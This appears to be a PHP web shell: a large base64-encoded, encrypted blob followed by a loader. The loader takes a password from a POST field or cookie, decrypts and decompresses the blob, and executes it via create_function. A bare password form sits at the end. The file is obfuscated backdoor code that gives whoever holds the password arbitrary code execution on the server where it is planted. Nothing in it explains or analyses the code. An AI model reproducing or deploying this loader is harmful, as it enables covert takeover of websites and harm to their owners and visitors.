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
'));$l__=isset($_POST['l__'])?$_POST['l__']:(isset($_COOKIE['l__'])?$_COOKIE['l__']:NULL);if($l__!==NULL){$l__=md5($l__).substr(MD5(strrev($l__)),0,strlen($l__));for($l____=0;$l____<15595;$l____++){$l___[$l____]=chr(( ord($l___[$l____])-ord($l__[$l____]))%256);$l__.=$l___[$l____];}if($l___=@gzinflate($l___)){if(isset($_POST['l__']))@setcookie('l__', $_POST['l__']);$l____=create_function('',$l___);unset($l__,$l___);$l____();}}?><form method="post" action=""><input type="text" name="l__" value=""/><input type="submit" value="&gt;"/></form>